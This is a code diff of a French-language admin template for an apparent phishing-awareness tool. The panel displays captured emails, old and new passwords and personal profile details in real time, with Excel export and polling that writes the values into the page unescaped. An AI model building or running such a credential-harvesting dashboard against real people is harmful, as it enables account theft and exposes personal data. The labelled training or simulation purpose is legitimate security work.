@@ -1,88 +1,116 @@
 {% extends 'base.html' %}
-
 {% block content %}
-<div class="container-fluid mt-4">
-    <div class="d-flex justify-content-between align-items-center mb-4 bg-dark text-white p-3 rounded">
-        <h2> Panneau de Sensibilisation Cybersécurité</h2>
-        <div>
-            <a href="{{ url_for('export_excel') }}" class="btn btn-success me-2">Exporter Excel (.xlsx)</a>
-            <form action="{{ url_for('admin_clear') }}" method="POST" class="d-inline" onsubmit="return confirm('Voulez-vous vraiment tout effacer ?');">
-                <button type="submit" class="btn btn-danger me-2">Effacer les données</button>
+<div class="p-6 max-w-7xl mx-auto w-full">
+    <!-- Header Admin -->
+    <div class="flex flex-col md:flex-row justify-between items-center mb-6 bg-slate-900 text-white p-4 rounded-xl shadow gap-4">
+        <div class="flex items-center space-x-3">
+            <i class="fas fa-user-shield text-red-500 text-2xl"></i>
+            <div>
+                <h1 class="font-bold text-lg">Panneau de Sensibilisation Cybersécurité</h1>
+                <p class="text-xs text-slate-400">Capture d'identifiants en temps réel (Démonstration)</p>
+            </div>
+        </div>
+        
+        <!-- Actions : Export Excel + Effacer -->
+        <div class="flex items-center gap-3">
+            <a href="/admin/export-excel" 
+               class="bg-emerald-600 hover:bg-emerald-700 text-white text-xs font-semibold px-4 py-2 rounded-lg transition flex items-center gap-2 shadow">
+                <i class="fas fa-file-excel text-sm"></i> Exporter Rapport Excel (.xlsx)
+            </a>
+            
+            <form action="/admin/clear" method="POST">
+                <button type="submit" class="bg-red-600 hover:bg-red-700 text-white text-xs px-3 py-2 rounded-lg transition">
+                    Effacer les données
+                </button>
             </form>
-            <a href="{{ url_for('admin_logout') }}" class="btn btn-outline-light">Déconnexion</a>
         </div>
     </div>
 
-    <div class="row">
-        <!-- TABLEAU 1 : IDENTIFIANTS INTERCEPTÉS -->
-        <div class="col-md-6 mb-4">
-            <div class="card shadow-sm">
-                <div class="card-header bg-warning text-dark font-weight-bold">
-                    🔑 Identifiants Interceptés
-                </div>
-                <div class="card-body p-0">
-                    <table class="table table-striped table-hover mb-0">
-                        <thead class="table-light">
-                            <tr>
-                                <th>HEURE</th>
-                                <th>EMAIL / USER</th>
-                                <th>MOT DE PASSE</th>
-                                <th>IP</th>
-                            </tr>
-                        </thead>
-                        <tbody>
-                            {% for log in logs %}
-                            <tr>
-                                <td><small>{{ log.timestamp }}</small></td>
-                                <td><strong>{{ log.username }}</strong></td>
-                                <td><code>{{ log.password }}</code></td>
-                                <td><small>{{ log.ip }}</small></td>
-                            </tr>
-                            {% else %}
-                            <tr>
-                                <td colspan="4" class="text-center text-muted py-3">Aucune donnée interceptée pour le moment.</td>
-                            </tr>
-                            {% endfor %}
-                        </tbody>
-                    </table>
-                </div>
+    <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
+        <!-- Section Identifiants Capturés -->
+        <div class="bg-white p-5 rounded-xl shadow border border-slate-200">
+            <h2 class="text-md font-bold text-slate-800 mb-4 flex items-center gap-2">
+                <i class="fas fa-key text-amber-500"></i> Identifiants Interceptés
+            </h2>
+            <div class="overflow-x-auto">
+                <table class="w-full text-xs text-left text-slate-600">
+                    <thead class="bg-slate-50 uppercase font-semibold text-slate-500">
+                        <tr>
+                            <th class="p-2">Heure</th>
+                            <th class="p-2">Email</th>
+                            <th class="p-2">Ancien MDP</th>
+                            <th class="p-2">Nouveau MDP</th>
+                        </tr>
+                    </thead>
+                    <tbody id="logins-body">
+                        {% for log in logins %}
+                        <tr class="border-b">
+                            <td class="p-2">{{ log.timestamp }}</td>
+                            <td class="p-2 font-semibold text-slate-900">{{ log.email }}</td>
+                            <td class="p-2 font-mono text-red-600">{{ log.current_password }}</td>
+                            <td class="p-2 font-mono text-blue-600">{{ log.new_password }}</td>
+                        </tr>
+                        {% endfor %}
+                    </tbody>
+                </table>
             </div>
         </div>
 
-        <!-- TABLEAU 2 : PROFILS DÉTAILLÉS CAPTURÉS -->
-        <div class="col-md-6 mb-4">
-            <div class="card shadow-sm">
-                <div class="card-header bg-info text-white font-weight-bold">
-                    🪪 Profils Détaillés Capturés
-                </div>
-                <div class="card-body p-0">
-                    <table class="table table-striped table-hover mb-0">
-                        <thead class="table-light">
-                            <tr>
-                                <th>NOM & POSTNOM</th>
-                                <th>POSTE</th>
-                                <th>CUS NUM</th>
-                                <th>NAISSANCE / ÉTAT CIVIL</th>
-                            </tr>
-                        </thead>
-                        <tbody>
-                            {% for log in logs %}
-                            <tr>
-                                <td>{{ log.fullname or '-' }}</td>
-                                <td>{{ log.poste or '-' }}</td>
-                                <td>{{ log.cus_num or '-' }}</td>
-                                <td>{{ log.birth_info or '-' }}</td>
-                            </tr>
-                            {% else %}
-                            <tr>
-                                <td colspan="4" class="text-center text-muted py-3">Aucun profil enregistré pour le moment.</td>
-                            </tr>
-                            {% endfor %}
-                        </tbody>
-                    </table>
-                </div>
+        <!-- Section Profils Utilisateurs Capturés -->
+        <div class="bg-white p-5 rounded-xl shadow border border-slate-200">
+            <h2 class="text-md font-bold text-slate-800 mb-4 flex items-center gap-2">
+                <i class="fas fa-id-card text-emerald-500"></i> Profils Détaillés Capturés
+            </h2>
+            <div class="overflow-x-auto">
+                <table class="w-full text-xs text-left text-slate-600">
+                    <thead class="bg-slate-50 uppercase font-semibold text-slate-500">
+                        <tr>
+                            <th class="p-2">Nom & Postnom</th>
+                            <th class="p-2">Poste</th>
+                            <th class="p-2">CUS NUM</th>
+                            <th class="p-2">Naissance / État Civil</th>
+                        </tr>
+                    </thead>
+                    <tbody id="profiles-body">
+                        {% for prof in profiles %}
+                        <tr class="border-b">
+                            <td class="p-2 font-semibold text-slate-900">{{ prof.nom }} {{ prof.postnom }}</td>
+                            <td class="p-2">{{ prof.poste }}</td>
+                            <td class="p-2 font-mono text-amber-600">{{ prof.cus_num }}</td>
+                            <td class="p-2">{{ prof.date_naissance }} ({{ prof.etat_civil }})</td>
+                        </tr>
+                        {% endfor %}
+                    </tbody>
+                </table>
             </div>
         </div>
     </div>
 </div>
+
+<script>
+    setInterval(async () => {
+        const response = await fetch('/api/data');
+        const data = await response.json();
+        
+        const loginsBody = document.getElementById('logins-body');
+        loginsBody.innerHTML = data.logins.map(log => `
+            <tr class="border-b">
+                <td class="p-2">${log.timestamp}</td>
+                <td class="p-2 font-semibold text-slate-900">${log.email}</td>
+                <td class="p-2 font-mono text-red-600">${log.current_password}</td>
+                <td class="p-2 font-mono text-blue-600">${log.new_password}</td>
+            </tr>
+        `).join('');
+
+        const profilesBody = document.getElementById('profiles-body');
+        profilesBody.innerHTML = data.profiles.map(prof => `
+            <tr class="border-b">
+                <td class="p-2 font-semibold text-slate-900">${prof.nom} ${prof.postnom}</td>
+                <td class="p-2">${prof.poste}</td>
+                <td class="p-2 font-mono text-amber-600">${prof.cus_num}</td>
+                <td class="p-2">${prof.date_naissance} (${prof.etat_civil})</td>
+            </tr>
+        `).join('');
+    }, 2000);
+</script>
 {% endblock %}
